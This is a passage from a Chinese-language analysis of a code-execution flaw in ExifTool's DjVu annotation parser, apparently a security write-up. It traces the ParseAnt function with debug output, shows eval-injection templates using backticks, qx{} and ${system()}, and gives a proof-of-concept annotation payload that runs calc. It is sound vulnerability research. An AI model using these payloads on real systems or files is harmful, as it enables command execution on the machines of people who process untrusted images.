表中定义了一些数据块字段名诸如INFO、ANTa、ANTz，字段中的`SubDirectory`指向了另一个标签表，其中ANTa和ANTz为同一个：
    # DjVu chunks that we parse (ref 4)
    %Image::ExifTool::DjVu::Main = (
        GROUPS => { 2 => 'Image' },
        NOTES => q{
            Information is extracted from the following chunks in DjVu images. See
            L for the DjVu specification.
        },
        INFO => {
            SubDirectory => { TagTable => 'Image::ExifTool::DjVu::Info' },
        },
        FORM => {
            TypeOnly => 1,  # extract chunk type only, then descend into chunk
            SubDirectory => { TagTable => 'Image::ExifTool::DjVu::Form' },
        },
        ANTa => {
            SubDirectory => { TagTable => 'Image::ExifTool::DjVu::Ant' },
        },
        ANTz => {
            Name => 'CompressedAnnotation',
            SubDirectory => {
                TagTable => 'Image::ExifTool::DjVu::Ant',
                ProcessProc => \&ProcessBZZ,
            }
        },
        INCL => 'IncludedFileID',
    );
接来下就开始循环获取数据块内容并调用`HandleTag`进行处理，如下图中获取到了`ANTa`注释块：
按照逻辑获取到注释块之后应该查找其在标签配置表`%Image::ExifTool::DjVu::Main`的位置，所以在`HandleTag`函数中获取到了`ANTa`注释块对应的`SubDirectory`，为`Image::ExifTool::DjVu::Ant`(参照前文标签配置表)，如下图：
因为得到的`SubDirectory`同样是一个标签表，所以会通过`GetTagTable`函数获取其内容，如下图：
获取的内容如下，其中的`PROCESS_PROC`指向了一个函数地址：
    # tags found in the DjVu annotation chunk (ANTz or ANTa)
    %Image::ExifTool::DjVu::Ant = (
        PROCESS_PROC => \&Image::ExifTool::DjVu::ProcessAnt,
        GROUPS => { 2 => 'Image' },
        NOTES => 'Information extracted from annotation chunks.',
        # Note: For speed, ProcessAnt() pre-scans for known tag ID's, so if any
        # new tags are added here they must also be added to the pre-scan check
        metadata => {
            SubDirectory => { TagTable => 'Image::ExifTool::DjVu::Meta' }
        },
        xmp => {
            Name => 'XMP',
            SubDirectory => { TagTable => 'Image::ExifTool::XMP::Main' }
        },
    );
上图代码的下一行会进入`ProcessDirectory`处理目录也就是标签表，在函数中的7708行通过`$$tagTablePtr{PROCESS_PROC}`将`Image::ExifTool::DjVu::ProcessAnt`的地址传递给变量`$proc`。`tagTablePtr`来自于`%Image::ExifTool::DjVu::Ant`，其中的`PROCESS_PROC`为硬编码，上方也能看出。
其后在7741行中调用了`$proc`传入了dirinfo哈希变量，其中的键`DataPt`包含了ANTa注释块的内容也就是我们的payload。
这时跟进去后在`ProcessAnt`中就发现了我们熟悉的`parseAnt`被调用，`ProcessAnt`的作用是处理DjVu注释块(ANTa或解码ANTz)，代码中首先取到了`$dataPt`，然后判断是否存在名称为metadata或xmp的部分S表达式，正常情况下的表达式为`(metadata
( ""))`。最后调用`parseAnt`解析表达式。
### parseAnt函数分析
到了关键的`parseAnt`函数，为什么会导致代码执行，下面就来分析一下该函数。为了方便理解，我在保持parseAnt原作用的情况下对调用进行了分析打印，代码如下：
    sub ParseAnt($)
    {
        my $dataPt = shift;
        print "首次进入变量内容为：".$$dataPt."\n";
        #print $$dataPt;
        my (@toks, $tok, $more);
        # (the DjVu annotation syntax really sucks, and requires that every
        # single token be parsed in order to properly scan through the items)
    Tok: for (;;) {
            # find the next token
            last unless $$dataPt =~ /(\S)/sg;   # get next non-space character
            print "获取的非空字符串为：".$1."\n";
            if ($1 eq '(') {       # start of list
                print "进入递归解析\n";
                $tok = ParseAnt($dataPt);
                print "进入递归结果为$tok\n";
            } elsif ($1 eq ')') {  # end of list
                $more = 1;
                last;
            } elsif ($1 eq '"') {  # quoted string
                my $tok = '';
                print "进入子串解析\n";
                for (;;) {
                    print "循环子串解析\n";
                    # get string up to the next quotation mark
                    # this doesn't work in perl 5.6.2! grrrr
                    # last Tok unless $$dataPt =~ /(.*?)"/sg;
                    # $tok .= $1;
                    my $pos = pos($$dataPt);
                    print "首个引号偏移量为：".$pos."\n";#第一个引号位置
                    last Tok unless $$dataPt =~ /"/sg;
                    print "第二个引号偏移量为：".pos($$dataPt)."\n";
                    my $len=pos($$dataPt)-1-$pos;
                    print "切割字符串为:$$dataPt,起始位置为:$pos,长度为:$len\n";
                    my $sub=substr($$dataPt, $pos, $len);
                    my $part=$tok;
                    $tok .= $sub;
                    print "切割后的字符串为:$tok=$part+$sub\n";#首先解析的是引号内的内容
                    # we're good unless quote was escaped by odd number of backslashes
                    last unless $tok =~ /(\\+)$/ and length($1) & 0x01;#处理存在转义的情况
                    $tok .= '"';    # quote is part of the string
                    print "如果是奇数个反斜杠结尾，则添加引号字符串为:$tok\n";
                }
                # must protect unescaped "$" and "@" symbols, and "\" at end of string
                $tok =~ s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge;
                # convert C escape sequences (allowed in quoted text)
                print "eval执行前为：$tok\n";
                $tok =eval qq{"$tok"};
                print "eval执行后为：$tok\n";
            } else {                # key name
                pos($$dataPt) = pos($$dataPt) - 1;
                # allow anything in key but whitespace, braces and double quotes
                # (this is one of those assumptions I mentioned)
                $tok = $$dataPt =~ /([^\s()"]+)/g ? $1 : undef;
            }
            push @toks, $tok if defined $tok;
        }
        # prevent further parsing unless more after this
        pos($$dataPt) = length $$dataPt unless $more;
        return @toks ? \@toks : undef;
    }
    my $ant='(metadata (name "exif\"tool"))';
    ParseAnt(\$ant)
上方代码中我会通过`parseAnt`来解析一个标准的DjVu注释`(metadata (name "exif\"tool"))`来带你理解函数的执行流程。
我将过程分为三个部分：
  1. 首先在循环中使用`last unless $$dataPt =~ /(\S)/sg`获取注释中的非空字符逐个判断，当字符为`"`时则进入内容解析，此时会通过pos函数获取前面正则匹配的引号位置。其后又使用正则和pos函数判断了下一个引号的位置，并使用substr切割其中的字符串。
  2. 关键代码`last unless $tok =~ /(\\+)$/ and length($1) & 0x01`中使用正则`(\\+)$`匹配切割后字符串结尾的反斜杠，通过and来连接`length($1) & 0x01;`(当单数和0x01进行与运算时会返回1)判断反斜杠是否为单数个， **单数个反斜杠说明该段内容中存在被转义的引号，则拼接一个引号到字符串中继续进行循环** ，直到匹配不到或者为偶数时退出循环，为什么要采用拼接双引号的形式，因为这里原本取的就是双引号之间的内容，所以不会取到其中原本就包含双引号的情况，需要拼接。
  3. 通过`s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge`替换模式将切割后字符串中的`$`和`@`字符分别转义为`\$`和`\@`避免之后带入eval造成代码执行风险。而eval的作用根据注释是实现对某些转义的处理，例如`\n`。
打印的执行结果如下：
    首次进入变量内容为：(metadata (name "exif\"tool"))
    获取的非空字符串为：(
    进入递归解析
    首次进入变量内容为：(metadata (name "exif\"tool"))
    获取的非空字符串为：m
    获取的非空字符串为：(
    进入递归解析
    首次进入变量内容为：(metadata (name "exif\"tool"))
    获取的非空字符串为：n
    获取的非空字符串为："
    进入子串解析
    循环子串解析
    上一个引号偏移量为：17
    第二个引号偏移量为：23
    切割字符串为:(metadata (name "exif\"tool")),起始位置为:17,长度为:5
    切割后的字符串为:exif\=+exif\
    如果是奇数个反斜杠结尾，则添加引号字符串为:exif\"
    循环子串解析
    上一个引号偏移量为：23
    第二个引号偏移量为：28
    切割字符串为:(metadata (name "exif\"tool")),起始位置为:23,长度为:4
    切割后的字符串为:exif\"tool=exif\"+tool
    eval执行前为：exif\"tool
    eval执行后为：exif"tool
    获取的非空字符串为：)
    进入递归结果为ARRAY(0x3ad4130)
    获取的非空字符串为：)
    进入递归结果为ARRAY(0x3ac87c0)
### parseAnt漏洞分析
通过上面的分析我们知道了函数中存在一个代码执行eval点如下：
    eval qq{"$tok"};
    #or
    eval "\"$tok\"";
在Perl提供了另一个引号机制，即qq和qx等(`双引号和反引号`)。使用`qq`运算符(`qq+界限符`)，就可以避免使用双引号将字符串包起来，从而不需额外转义在字符串中原本带有的双引号。界限符可以选择：`(
),,{ },[ ]`其中的一对。使用`qx`运算符相当于使用`system`函数，可以用于执行系统命令。
要想在这个环境中执行系统命令就需要在变量`$tok`包含`.`来连接表达式的值和`"`来闭合原有的双引号(结尾也可以选择使用#来注释掉)，或者包含标量`${`从而不需要`"`和`.`，将`$tok`替换后如下：
    $tok = '".`command`."'; #or '".`command`#"';
    $tok = eval "".`command`.""; #or  eval "".`command`#"";
    #or
    $tok = '".qx{command}."';
    $tok = eval "".qx{command}."";
    #or
    $tok = '"${system(command)}"';
    $tok = eval "${system(command)}";
了解这些知识后我们再结合源码来看payload，先看需要进行闭合的payload：
    (metadata "\
    ".`calc`.\"g"
可以看到第一对双引号之间包含一个反斜杠和换行符，根据源码分析，第一步将会提取两个引号之间的字符串保存在tok变量中，正常情况下提取出来的字符串中不会包含未转义的引号，这时取到反斜杠+换行符，第二步判断是否单数个反斜杠结尾，这里的结尾判断使用的正则`$`匹配，来看看
**perl官方文档** [7] 对`$`的定义：